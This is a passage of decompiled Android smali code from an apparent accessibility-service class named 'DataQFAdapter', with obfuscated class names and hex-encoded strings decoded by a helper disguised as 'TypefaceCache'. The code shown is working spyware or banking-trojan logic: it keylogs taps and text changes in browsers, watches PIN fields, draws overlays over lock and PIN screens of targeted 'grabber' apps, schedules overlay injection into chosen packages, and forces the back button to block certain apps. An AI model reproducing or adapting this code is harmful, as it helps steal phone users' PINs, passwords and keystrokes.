    invoke-static {}, Lv/s/vbdyByOHPJmeGXlq;->D5P1xCAyuvgF()Ljava/lang/String;

    .line 1170
    .line 1171
    .line 1172
    move-result-object v5

    .line 1173
    invoke-static {v0, v5}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 1174
    .line 1175
    .line 1176
    move-result v0

    .line 1177
    if-eqz v0, :cond_20

    .line 1178
    .line 1179
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1180
    .line 1181
    .line 1182
    move-result-object v0

    .line 1183
    invoke-static {v2, v0}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 1184
    .line 1185
    .line 1186
    move-result v0

    nop

    nop

    .line 1187
    if-nez v0, :cond_1f

    .line 1188
    .line 1189
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1190
    .line 1191
    .line 1192
    move-result-object v0

    .line 1193
    invoke-static {v2, v0}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 1194
    .line 1195
    .line 1196
    move-result v0

    .line 1197
    if-nez v0, :cond_1f

    .line 1198
    .line 1199
    const-string v0, "00200079005600C900F100B100D600B5002C007F005F00C900E300BA00C600B3002A0078005C0094"

    .line 1200
    .line 1201
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1202
    .line 1203
    .line 1204
    move-result-object v0

    .line 1205
    invoke-static {v2, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 1206
    .line 1207
    .line 1208
    move-result v0

    .line 1209
    if-nez v0, :cond_1f

    .line 1210
    .line 1211
    const-string v0, "00200079005600C900E300BA00D100E900220078005F009500FF00B600D600E900220066004B00C900FC00BE00C700A90020007E005E0095"

    .line 1212
    .line 1213
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1214
    .line 1215
    .line 1216
    move-result-object v0

    nop

    .line 1217
    invoke-static {v2, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 1218
    .line 1219
    .line 1220
    move-result v0

    .line 1221
    if-eqz v0, :cond_20

    .line 1222
    .line 1223
    :cond_1f
    const/4 v2, 0x1

    .line 1224
    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 1225
    .line 1226
    .line 1227
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 1228
    .line 1229
    const v2, 0x16

    .line 1230
    .line 1231
    invoke-direct {v0, v1, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 1232
    .line 1233
    .line 1234
    invoke-direct {v1, v0, v13, v14}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 1235
    .line 1236
    .line 1237
    goto/16 :goto_3c

    .line 1238
    .line 1239
    :cond_20
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 1240
    .line 1241
    invoke-static {v2, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 1242
    .line 1243
    .line 1244
    move-result v0

    nop

    nop

    .line 1245
    if-nez v0, :cond_28

    .line 1246
    .line 1247
    invoke-direct {v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->isImePackage(Ljava/lang/String;)Z

    .line 1248
    .line 1249
    .line 1250
    move-result v0

    .line 1251
    if-nez v0, :cond_28

    nop

    .line 1252
    .line 1253
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockScreenPackages:Ljava/util/Set;

    .line 1254
    .line 1255
    invoke-interface {v0, v2}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1256
    .line 1257
    .line 1258
    move-result v5

    nop

    nop

    .line 1259
    if-nez v5, :cond_21

    .line 1260
    .line 1261
    iget-object v5, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 1262
    .line 1263
    invoke-interface {v0, v5}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1264
    .line 1265
    .line 1266
    move-result v5

    .line 1267
    if-eqz v5, :cond_21

    .line 1268
    .line 1269
    sget-object v5, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1270
    .line 1271
    invoke-virtual {v5}, Lv/s/GARjgaGEpTotOxcl8vfe;->b1EoSIRjJHO5()V

    .line 1272
    .line 1273
    .line 1274
    invoke-virtual {v5}, Lv/s/GARjgaGEpTotOxcl8vfe;->ibVTtJUNfrGYbW()V

    .line 1275
    .line 1276
    .line 1277
    :cond_21
    invoke-interface {v0, v2}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1278
    .line 1279
    .line 1280
    move-result v0

    .line 1281
    if-eqz v0, :cond_22

    .line 1282
    .line 1283
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1284
    .line 1285
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 1286
    .line 1287
    .line 1288
    invoke-static {v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->JXn4Qf7zpnLjP5(Ljava/lang/String;)V

    .line 1289
    .line 1290
    .line 1291
    invoke-static {v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->vekpFI4d1Nc4fakF(Ljava/lang/String;)V

    .line 1292
    .line 1293
    .line 1294
    :cond_22
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1295
    .line 1296
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 1297
    .line 1298
    .line 1299
    invoke-static {v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->MSGkxvPxRYNqC(Ljava/lang/String;)Z

    .line 1300
    .line 1301
    .line 1302
    move-result v5

    .line 1303
    if-eqz v5, :cond_24

    .line 1304
    .line 1305
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 1306
    .line 1307
    iget-object v5, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayRemoveRunnable:Ljava/lang/Runnable;

    .line 1308
    .line 1309
    invoke-virtual {v4, v5}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 1310
    .line 1311
    .line 1312
    iget-boolean v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    nop

    .line 1313
    .line 1314
    if-nez v4, :cond_23

    nop

    nop

    .line 1315
    .line 1316
    invoke-direct {v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->preAddPinOverlay(Ljava/lang/String;)V

    .line 1317
    .line 1318
    .line 1319
    goto/16 :goto_13

    .line 1320
    :cond_23
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 1321
    .line 1322
    invoke-static {v4, v2}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 1323
    .line 1324
    .line 1325
    move-result v4

    .line 1326
    if-nez v4, :cond_27

    .line 1327
    .line 1328
    iput-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 1329
    .line 1330
    goto/16 :goto_13

    .line 1331
    :cond_24
    sget-object v5, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 1332
    .line 1333
    iget-object v7, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 1334
    .line 1335
    invoke-virtual {v5, v7}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->contains(Ljava/lang/Object;)Z

    .line 1336
    .line 1337
    .line 1338
    move-result v5

    .line 1339
    if-nez v5, :cond_25

    .line 1340
    .line 1341
    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 1342
    .line 1343
    .line 1344
    move-result-object v5

    .line 1345
    sget-object v7, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 1346
    .line 1347
    invoke-virtual {v5, v7}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 1348
    .line 1349
    .line 1350
    move-result-object v5

    .line 1351
    invoke-static {v2, v5}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 1352
    .line 1353
    .line 1354
    move-result v5

    .line 1355
    if-nez v5, :cond_27

    .line 1356
    .line 1357
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1358
    .line 1359
    .line 1360
    move-result-object v5

    nop

    nop

    .line 1361
    invoke-static {v2, v5}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 1362
    .line 1363
    .line 1364
    move-result v5

    .line 1365
    if-nez v5, :cond_27

    .line 1366
    .line 1367
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1368
    .line 1369
    .line 1370
    move-result-object v4

    .line 1371
    invoke-static {v2, v4}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 1372
    .line 1373
    .line 1374
    move-result v4

    nop

    nop

    .line 1375
    if-nez v4, :cond_27

    .line 1376
    .line 1377
    const-string v4, "002A0078004B009200E400B200D700B3002B0079005F"

    .line 1378
    .line 1379
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1380
    .line 1381
    .line 1382
    move-result-object v4

    .line 1383
    invoke-static {v2, v4}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 1384
    .line 1385
    .line 1386
    move-result v4

    .line 1387
    if-nez v4, :cond_27

    .line 1388
    .line 1389
    const-string v4, "002800730042008500FF00BE00C000A3"

    .line 1390
    .line 1391
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1392
    .line 1393
    .line 1394
    move-result-object v4

    nop

    nop

    .line 1395
    invoke-static {v2, v4}, Lv/s/KgSM0TsKUpCiuePB;->is7XW2V21HfKv7MihWy(Ljava/lang/CharSequence;Ljava/lang/String;)Z

    .line 1396
    .line 1397
    .line 1398
    move-result v4

    .line 1399
    if-eqz v4, :cond_25

    nop

    nop

    .line 1400
    .line 1401
    goto/16 :goto_13

    .line 1402
    :cond_25
    iget-boolean v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayTouchable:Z

    .line 1403
    .line 1404
    if-eqz v4, :cond_26

    .line 1405
    .line 1406
    invoke-virtual {v1, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->setPinOverlayTouchable$app_release(Z)V

    .line 1407
    .line 1408
    .line 1409
    :cond_26
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 1410
    .line 1411
    iget-object v5, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayRemoveRunnable:Ljava/lang/Runnable;

    .line 1412
    .line 1413
    invoke-virtual {v4, v5}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 1414
    .line 1415
    .line 1416
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayRemoveRunnable:Ljava/lang/Runnable;

    .line 1417
    .line 1418
    const-wide/16 v5, 0x2710

    .line 1419
    .line 1420
    invoke-direct {v1, v4, v5, v6}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Ljava/lang/Runnable;J)V

    .line 1421
    .line 1422
    .line 1423
    :cond_27
    :goto_13
    invoke-direct {v1}, Lapp/mobilex/plus/services/DataQFAdapter;->flushAllPendingKeylogs()V

    .line 1424
    .line 1425
    .line 1426
    iput-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 1427
    .line 1428
    invoke-direct {v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveAppName(Ljava/lang/String;)Ljava/lang/String;

    .line 1429
    .line 1430
    .line 1431
    move-result-object v4

    .line 1432
    iput-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 1433
    .line 1434
    new-instance v21, Lv/s/NxAMaDFbSCxW6M03f;

    .line 1435
    .line 1436
    const-string v4, "00220066004B00B800E300A800DB00B30020007E"

    .line 1437
    .line 1438
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1439
    .line 1440
    .line 1441
    move-result-object v22

    .line 1442
    iget-object v4, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 1443
    .line 1444
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 1445
    .line 1446
    .line 1447
    move-result-wide v26

    .line 1448
    const/16 v29, 0x0

    .line 1449
    .line 1450
    const/16 v30, 0x1e0

    .line 1451
    .line 1452
    const/16 v28, 0x0

    .line 1453
    .line 1454
    move-object/from16 v24, v4

    .line 1455
    .line 1456
    move-object/from16 v25, v2

    .line 1457
    .line 1458
    move-object/from16 v23, v4

    .line 1459
    .line 1460
    invoke-direct/range {v21 .. v30}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;ZI)V

    .line 1461
    .line 1462
    .line 1463
    move-object/from16 v4, v21

    .line 1464
    .line 1465
    invoke-virtual {v0, v4}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 1466
    .line 1467
    .line 1468
    :cond_28
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1469
    .line 1470
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 1471
    .line 1472
    .line 1473
    invoke-static {v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->MSGkxvPxRYNqC(Ljava/lang/String;)Z

    .line 1474
    .line 1475
    .line 1476
    move-result v0

    .line 1477
    if-eqz v0, :cond_29

    nop

    nop

    .line 1478
    .line 1479
    invoke-direct {v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->detectPinScreenAndShowOverlay(Ljava/lang/String;)V

    .line 1480
    .line 1481
    .line 1482
    :cond_29
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->lockedApps:Ljava/util/Set;

    .line 1483
    .line 1484
    invoke-interface {v0}, Ljava/util/Collection;->isEmpty()Z

    .line 1485
    .line 1486
    .line 1487
    move-result v0

    .line 1488
    if-eqz v0, :cond_2a

    .line 1489
    .line 1490
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->blockedApps:Ljava/util/Set;

    .line 1491
    .line 1492
    invoke-interface {v0}, Ljava/util/Collection;->isEmpty()Z

    .line 1493
    .line 1494
    .line 1495
    move-result v0
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_1

    .line 1496
    if-nez v0, :cond_2b

    .line 1497
    .line 1498
    :cond_2a
    :try_start_12
    invoke-direct {v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->checkAppLock(Ljava/lang/String;)V
    :try_end_12
    .catchall {:try_start_12 .. :try_end_12} :catchall_7

    .line 1499
    .line 1500
    .line 1501
    goto/16 :goto_14

    .line 1502
    :catchall_7
    move-exception v0

    .line 1503
    :try_start_13
    const-string v4, "0020007E005E008400FB009E00C200B7000F00790058008C00B000BC00C000A60030007E000100C7"

    .line 1504
    .line 1505
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1506
    .line 1507
    .line 1508
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 1509
    .line 1510
    .line 1511
    :cond_2b
    :goto_14
    invoke-static {}, Lv/s/oJLsXXGxdTuQpIRpV;->dDIMxZXP1V8HdM()Z

    .line 1512
    .line 1513
    .line 1514
    move-result v0
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_1

    .line 1515
    if-eqz v0, :cond_2c

    .line 1516
    .line 1517
    :try_start_14
    sget-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 1518
    .line 1519
    invoke-static {v2}, Lv/s/GQh1bKoqkKhujFH2nJ;->w9sT1Swbhx3hs(Ljava/lang/String;)Z

    .line 1520
    .line 1521
    .line 1522
    move-result v0

    .line 1523
    if-eqz v0, :cond_2c

    .line 1524
    .line 1525
    iput-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pendingInjectPkg:Ljava/lang/String;

    .line 1526
    .line 1527
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 1528
    .line 1529
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->injectRunnable:Ljava/lang/Runnable;

    .line 1530
    .line 1531
    invoke-virtual {v0, v2}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 1532
    .line 1533
    .line 1534
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->injectRunnable:Ljava/lang/Runnable;

    nop

    nop

    .line 1535
    .line 1536
    const-wide/16 v4, 0x96

    .line 1537
    .line 1538
    invoke-direct {v1, v0, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Ljava/lang/Runnable;J)V
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_8

    .line 1539
    .line 1540
    .line 1541
    goto :goto_15

    .line 1542
    :catchall_8
    move-exception v0

    .line 1543
    :try_start_15
    const-string v2, "000A00780051008200F300AB009200B30031007F005C008000F500AD009200A2003100640054009500AA00FF"

    .line 1544
    .line 1545
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 1546
    .line 1547
    .line 1548
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 1549
    .line 1550
    .line 1551
    :cond_2c
    :goto_15
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 1552
    .line 1553
    .line 1554
    move-result v0

    .line 1555
    const/16 v2, 0x4

    .line 1556
    if-eq v0, v2, :cond_2d

    .line 1557
    .line 1558
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 1559
    .line 1560
    .line 1561
    move-result v0

    .line 1562
    const/4 v2, 0x1

    .line 1563
    if-ne v0, v2, :cond_31

    .line 1564
    .line 1565
    :cond_2d
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 1566
    .line 1567
    .line 1568
    move-result-object v0

    .line 1569
    if-eqz v0, :cond_2e

    .line 1570
    .line 1571
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 1572
    .line 1573
    .line 1574
    move-result-object v0

    .line 1575
    if-nez v0, :cond_2f

    nop

    nop

    .line 1576
    .line 1577
    :cond_2e
    move-object v0, v12

    .line 1578
    :cond_2f
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->lockScreenPackages:Ljava/util/Set;

    nop

    .line 1579
    .line 1580
    invoke-interface {v2, v0}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1581
    .line 1582
    .line 1583
    move-result v2

    .line 1584
    if-eqz v2, :cond_30

    .line 1585
    .line 1586
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1587
    .line 1588
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 1589
    .line 1590
    .line 1591
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->JXn4Qf7zpnLjP5(Ljava/lang/String;)V

    .line 1592
    .line 1593
    .line 1594
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->vekpFI4d1Nc4fakF(Ljava/lang/String;)V

    .line 1595
    .line 1596
    .line 1597
    :cond_30
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 1598
    .line 1599
    .line 1600
    move-result v2

    .line 1601
    const/4 v4, 0x1

    .line 1602
    if-ne v2, v4, :cond_31

    .line 1603
    .line 1604
    invoke-direct {v1, v9, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->captureTapKey(Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)V

    .line 1605
    .line 1606
    .line 1607
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1608
    .line 1609
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 1610
    .line 1611
    .line 1612
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->MSGkxvPxRYNqC(Ljava/lang/String;)Z

    .line 1613
    .line 1614
    .line 1615
    move-result v2

    .line 1616
    if-eqz v2, :cond_31

    .line 1617
    .line 1618
    iget-boolean v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 1619
    .line 1620
    if-nez v2, :cond_31

    .line 1621
    .line 1622
    invoke-direct {v1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->detectPinScreenAndShowOverlay(Ljava/lang/String;)V

    .line 1623
    .line 1624
    .line 1625
    :cond_31
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 1626
    .line 1627
    .line 1628
    move-result v0

    .line 1629
    if-ne v0, v8, :cond_36

    .line 1630
    .line 1631
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 1632
    .line 1633
    .line 1634
    move-result-object v0

    .line 1635
    if-eqz v0, :cond_32

    .line 1636
    .line 1637
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 1638
    .line 1639
    .line 1640
    move-result-object v0

    nop

    .line 1641
    if-nez v0, :cond_33

    .line 1642
    .line 1643
    :cond_32
    move-object v0, v12

    .line 1644
    :cond_33
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->lockScreenPackages:Ljava/util/Set;

    .line 1645
    .line 1646
    invoke-interface {v2, v0}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1647
    .line 1648
    .line 1649
    move-result v2

    .line 1650
    if-eqz v2, :cond_34

    nop

    .line 1651
    .line 1652
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1653
    .line 1654
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 1655
    .line 1656
    .line 1657
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->JXn4Qf7zpnLjP5(Ljava/lang/String;)V

    .line 1658
    .line 1659
    .line 1660
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->vekpFI4d1Nc4fakF(Ljava/lang/String;)V

    .line 1661
    .line 1662
    .line 1663
    :cond_34
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 1664
    .line 1665
    invoke-virtual {v2, v0}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->contains(Ljava/lang/Object;)Z

    .line 1666
    .line 1667
    .line 1668
    move-result v2

    .line 1669
    if-eqz v2, :cond_35

    .line 1670
    .line 1671
    invoke-direct {v1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->monitorPinFieldChange(Ljava/lang/String;)V

    .line 1672
    .line 1673
    .line 1674
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 1675
    .line 1676
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 1677
    .line 1678
    .line 1679
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->MSGkxvPxRYNqC(Ljava/lang/String;)Z

    .line 1680
    .line 1681
    .line 1682
    move-result v2

    .line 1683
    if-eqz v2, :cond_35

    .line 1684
    .line 1685
    invoke-direct {v1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->detectPinScreenAndShowOverlay(Ljava/lang/String;)V

    .line 1686
    .line 1687
    .line 1688
    :cond_35
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getContentChangeTypes()I

    .line 1689
    .line 1690
    .line 1691
    move-result v2

    nop

    .line 1692
    and-int/lit8 v2, v2, 0x2

    .line 1693
    .line 1694
    if-eqz v2, :cond_36

    .line 1695
    .line 1696
    iget-object v2, v1, Lapp/mobilex/plus/services/DataQFAdapter;->chromeLikeBrowsers:Ljava/util/Set;

    .line 1697
    .line 1698
    invoke-interface {v2, v0}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 1699
    .line 1700
    .line 1701
    move-result v2

    .line 1702
    if-eqz v2, :cond_36

    .line 1703
    .line 1704
    invoke-direct {v1, v9, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->handleChromeTextChange(Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)V

    .line 1705
    .line 1706
    .line 1707
    :cond_36
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 1708
    .line 1709
    .line 1710
    move-result v0
    :try_end_15
    .catchall {:try_start_15 .. :try_end_15} :catchall_1

    .line 1711
    const v2, 0x10

    .line 1712
    .line 1713
    const-string v10, ":"

    .line 1714
    .line 1715
    if-ne v0, v2, :cond_65

    .line 1716
    .line 1717
    :try_start_16
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 1718
    .line 1719
    .line 1720
    move-result-object v0

    .line 1721
    if-eqz v0, :cond_37

    .line 1722
    .line 1723
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 1724
    .line 1725
    .line 1726
    move-result-object v0

    nop

    .line 1727
    if-nez v0, :cond_38

    .line 1728
    .line 1729
    :cond_37
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 1730
    .line 1731
    :cond_38
    invoke-direct {v1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->isImePackage(Ljava/lang/String;)Z

    .line 1732
    .line 1733
    .line 1734
    move-result v2

    .line 1735
    if-eqz v2, :cond_39

    .line 1736
    .line 1737
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 1738
    .line 1739
    :cond_39
    move-object/from16 v5, v0

    .line 1740
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    nop

    nop

    .line 1741
    .line 1742
    invoke-static {v5, v0}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 1743
    .line 1744
    .line 1745
    move-result v0

    nop

    nop

    .line 1746
    if-eqz v0, :cond_3a

    nop

    nop

    .line 1747
    .line 1748
    iget-object v0, v1, Lapp/mobilex/plus/services/DataQFAdapter;->currentAppName:Ljava/lang/String;

    .line 1749
    .line 1750
    :goto_16
    move-object v4, v0

    .line 1751
    goto :goto_17

    .line 1752
    :cond_3a
    invoke-direct {v1, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveAppName(Ljava/lang/String;)Ljava/lang/String;

    .line 1753
    .line 1754
    .line 1755
    move-result-object v0

    .line 1756
    goto :goto_16

    .line 1757
    :goto_17
    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    .line 1758
    .line 1759
    .line 1760
    move-result-object v0

    .line 1761
    if-eqz v0, :cond_3b

    .line 1762
    .line 1763
    const/16 v2, 0x3e

    .line 1764
    .line 1765
    const/4 v11, 0x0

    .line 1766
